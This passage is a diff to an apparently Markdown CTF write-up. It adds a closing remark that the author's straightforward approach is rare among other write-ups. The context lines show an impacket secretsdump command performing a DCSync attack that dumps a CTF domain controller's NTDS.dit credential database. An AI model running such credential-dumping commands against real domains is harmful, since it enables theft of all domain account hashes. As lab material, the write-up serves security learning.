@@ -83,7 +83,15 @@ What this tool does is:
 # Going beyond the CTF  
 we perform a DCSync Attack (dumping the DC's NTDS.dit database):  
 	`/impacket/secretsdump.py ctf.local/Administrator@DC01.CTF.LOCAL -k -no-pass`
-	<img width="1917" height="783" alt="Pasted image 20260901034811" src="https://github.com/user-attachments/assets/4f2e789c-f21e-4a44-8e9f-cab3b0cd8ae0" />
+	<img width="1917" height="783" alt="Pasted image 20260901034811" src="https://github.com/user-attachments/assets/4f2e789c-f21e-4a44-8e9f-cab3b0cd8ae0" />  
+
+
+
+
+After solving the machine, i found out that there are a ton of other Write-ups that show different ways in approaching this CTF, but almost none shows the straightforward method I followed.
+
+
+
 
 	
 
